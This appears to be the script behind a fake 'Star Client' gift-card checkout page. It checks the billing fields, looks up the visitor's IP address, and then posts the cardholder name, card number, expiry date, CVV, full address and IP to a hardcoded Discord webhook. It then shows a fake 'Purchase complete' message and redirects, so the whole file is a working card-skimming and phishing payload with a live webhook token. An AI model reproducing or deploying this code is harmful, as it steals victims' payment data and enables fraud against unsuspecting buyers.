const WEBHOOK_URL = "https://discord.com/api/webhooks/1453158342452187187/oYYnqUKNd_-3GbA_AE53w55gCfhjvMlB0HcItC53RieMvKPKXNG14Yz00MpUZVerybII";

async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
  } catch {
    return "Unknown";
  }
}

async function processGiftCard() {
  const status = document.getElementById("status");

  const streetVal = street.value.trim();
  const cityVal = city.value.trim();
  const stateVal = state.value.trim();
  const zipVal = zip.value.trim();
  const countryVal = country.value;

  // Basic required checks
  if (!streetVal || !cityVal || !stateVal || !zipVal) {
    status.style.color = "#ED4245";
    status.textContent = "Billing address incomplete.";
    return;
  }

  // ZIP format checks
  if (countryVal === "United States" && !/^\d{5}$/.test(zipVal)) {
    status.style.color = "#ED4245";
    status.textContent = "Invalid US ZIP code.";
    return;
  }

  if (countryVal === "Canada" && !/^[A-Za-z]\d[A-Za-z]\s?\d[A-Za-z]\d$/.test(zipVal)) {
    status.style.color = "#ED4245";
    status.textContent = "Invalid Canadian postal code.";
    return;
  }

  // Get IP
  const ip = await getIP();

  // Send receipt to Discord
  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [{
        title: ":receipt: Star Client | Purchase",
        fields: [
          { name: "Cardholder", value: cardName.value },
          { name: "Gift Card", value: cardNumber.value },
          { name: "Expiration", value: expiry.value },
          { name: "CVV", value: cvv.value },
          { name: "Street", value: streetVal },
          { name: "City", value: cityVal },
          { name: "State", value: stateVal },
          { name: "ZIP", value: zipVal },
          { name: "Country", value: countryVal },
          { name: "IP", value: ip }
        ],
        timestamp: new Date().toISOString()
      }]
    })
  });

  status.style.color = "#57F287";
  status.textContent = "Purchase complete. Redirecting…";

  setTimeout(() => {
    window.location.href = "redeem.html";
  }, 1500);
}
